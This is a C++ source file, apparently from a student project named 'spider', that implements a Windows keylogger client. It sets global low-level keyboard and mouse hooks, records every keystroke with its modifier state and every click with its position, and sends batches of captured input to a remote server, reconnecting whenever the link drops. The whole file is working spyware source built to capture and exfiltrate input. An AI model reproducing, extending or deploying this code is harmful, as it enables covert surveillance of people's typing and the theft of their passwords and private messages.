//
//	Created by hugo.baladssin@epitech.eu on 27/09/17
//

#include <Windowsx.h>
#include <windows.h>
#include <sstream>
#include <string>
#include <fstream>
#include <exception>

#include "Keylogger.h"
#include "macros.h"

HHOOK	kbdhook;
HHOOK	mshook;

__declspec(dllexport) LRESULT CALLBACK	handleKeys(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		char tmp[0xFF] = { 0 };
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;
		SHORT state;
		uint8_t special = 0;
		static bool capslock = false;

		if (st_hook.vkCode == VK_CAPITAL)
			capslock = !capslock;

		state = GetKeyState(VK_SHIFT);
		special = (state & 0x8000) ? special | 0x01 : special;
		state = GetKeyState(VK_LMENU);
		special = (state & 0x8000) ? special | 0x02 : special;
		state = GetKeyState(VK_CONTROL);
		special = (state & 0x8000) ? special | 0x04 : special;
		state = GetKeyState(VK_RMENU);
		special = (state & 0x8000) ? special | 0x08 : special;

		if (capslock && CHECK_BIT(special, 0))
			special ^= (0 ^ special) & (1 << 0);
		else if (capslock && !CHECK_BIT(special, 0))
			special |= 0x01;

		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		if (!printable)
			str = ("[" + str + "]");

		POINT	p;
		t_input	input;
		
		p.x = -1;
		p.y = -1;
		if (keylog.parser.parseInput(input, static_cast<uint8_t>(st_hook.vkCode), p, special))
			keylog.getInputs().push_back(input);
#ifdef DEBUG
		std::stringstream res;

		res << "res: " << (int)special << " vkcode: " << st_hook.vkCode << " key: " << str << std::endl;
		res << "size: " << keylog.getInputs().size() << std::endl;
		OutputDebugString(res.str().c_str());
#endif
	}

	if (keylog.getInputs().size() >= MAX_INPUTS)
	{
		bool isConnected = keylog.pingServer();

		if (isConnected == false)
		{
			keylog.stopCmdCommunicator();
			keylog.stopDataCommunicator();
			isConnected = keylog.reconnectToServer();
		}
		if (isConnected == true)
		{
			std::vector<char> to_send;
			std::vector<t_input> part(&keylog.getInputs()[0], &keylog.getInputs()[99]);

			to_send = keylog.parser.formatInputsForSending(part);
			to_send.push_back('\r');
			to_send.push_back('\n');
			keylog.data_communicator->send(to_send.data(), to_send.size());
			keylog.getInputs().erase(keylog.getInputs().begin(), keylog.getInputs().begin() + 100);
		}
	}
	return CallNextHookEx(kbdhook, code, wp, lp);
}

__declspec(dllexport) LRESULT CALLBACK	handleMouse(int code, WPARAM wp, LPARAM lp)
{
	std::stringstream	str;
	POINT				p;
	bool				res = false;

	if (code == HC_ACTION && (wp == WM_RBUTTONDOWN || wp == WM_LBUTTONDOWN)) {
		GetCursorPos(&p);
		t_input		input;
		
		if (code == HC_ACTION && wp == WM_LBUTTONDOWN)
		{
			str << "*lclick* at x: " << p.x << " and y: " << p.y << std::endl;
			res = keylog.parser.parseInput(input, VK_LBUTTON, p, 0);
		}
		else if (code == HC_ACTION && wp == WM_RBUTTONDOWN)
		{
			str << "*lclick* at x: " << p.x << " and y: " << p.y << std::endl;
			res = keylog.parser.parseInput(input, VK_RBUTTON, p, 0);
		}
		if (res)
			keylog.getInputs().push_back(input);

#ifdef DEBUG
		OutputDebugString(str.str().c_str());
#endif
	}

	if (res && keylog.getInputs().size() >= MAX_INPUTS)
	{
		bool isConnected = keylog.pingServer();

		if (isConnected == false)
		{
			keylog.stopCmdCommunicator();
			keylog.stopDataCommunicator();
			isConnected = keylog.reconnectToServer();
		}
		if (isConnected == true)
		{
			std::vector<char> to_send;
			std::vector<t_input> part(&keylog.getInputs()[0], &keylog.getInputs()[99]);

			to_send = keylog.parser.formatInputsForSending(part);
			to_send.push_back('\r');
			to_send.push_back('\n');
			keylog.data_communicator->send(to_send.data(), to_send.size());
			keylog.getInputs().erase(keylog.getInputs().begin(), keylog.getInputs().begin() + 100);
		}
	}
	return CallNextHookEx(mshook, code, wp, lp);
}

std::vector<t_input>&	spider::client::Keylogger::getInputs()
{
	return inputs;
}

void	spider::client::Keylogger::init()
{
	HINSTANCE		modulehandle;

	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handleKeys, modulehandle, NULL);
	mshook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)handleMouse, modulehandle, NULL);
}

void spider::client::Keylogger::connectToServer()
{
	bool isInitOK;
	std::string data_port;

	isInitOK = false;

	OutputDebugString("entering connectToServer\n");

	while (!isInitOK)
	{
		keylog.initCmdCommunicator();
		if (keylog.cmd_communicator->init(SERVER_ADDR, SERVER_PORT))
		{
			isInitOK = false;
			keylog.stopCmdCommunicator();
		}
		else
			isInitOK = true;
	}

	OutputDebugString("a\n");

	keylog.cmd_communicator->receive(data_port, 1024);

	OutputDebugString("b\n");


	isInitOK = false;
	while (!isInitOK)
	{
		keylog.initDataCommunicator();
		if (keylog.data_communicator->init(SERVER_ADDR, data_port))
		{
			isInitOK = false;
			keylog.stopDataCommunicator();
		}
		else
			isInitOK = true;
	}

	OutputDebugString("c\n");
}

bool				spider::client::Keylogger::reconnectToServer()
{
	std::string data_port;

	OutputDebugString("entering reconnectToServer\n");

	keylog.initCmdCommunicator();
	if (keylog.cmd_communicator->init(SERVER_ADDR, SERVER_PORT))
	{
		keylog.stopCmdCommunicator();
		keylog.cmd_communicator = nullptr;
		return false;
	}
	OutputDebugString("d\n");

	keylog.cmd_communicator->receive(data_port, 1024);

	OutputDebugString("e\n");
	keylog.initDataCommunicator();
	if (keylog.data_communicator->init(SERVER_ADDR, data_port))
	{
		keylog.stopDataCommunicator();
		keylog.data_communicator = nullptr;
		return false;
	}
	OutputDebugString("f\n");
	return true;
}

bool spider::client::Keylogger::pingServer()
{
	std::string data;

	if (keylog.data_communicator == nullptr || keylog.cmd_communicator == nullptr)
		return false;
	try
	{
		keylog.cmd_communicator->send("PING\r\n", 6);
		keylog.cmd_communicator->receive(data, 6);
		OutputDebugString("received <");
		OutputDebugString(data.c_str());
		OutputDebugString(">\n");
		if (data != "PONG")
			return false;
		return true;
	}
	catch (const std::exception &e)
	{
		OutputDebugString(e.what());
		return false;
	}
}

void			spider::client::Keylogger::initDataCommunicator()
{
	data_communicator = new Communicator();
}

void			spider::client::Keylogger::stopDataCommunicator()
{
	if (data_communicator != nullptr)
		delete data_communicator;
	data_communicator = nullptr;
}

void			spider::client::Keylogger::initCmdCommunicator()
{
	cmd_communicator = new Communicator();
}

void			spider::client::Keylogger::stopCmdCommunicator()
{
	if (cmd_communicator != nullptr)
		delete cmd_communicator;
	cmd_communicator = nullptr;
}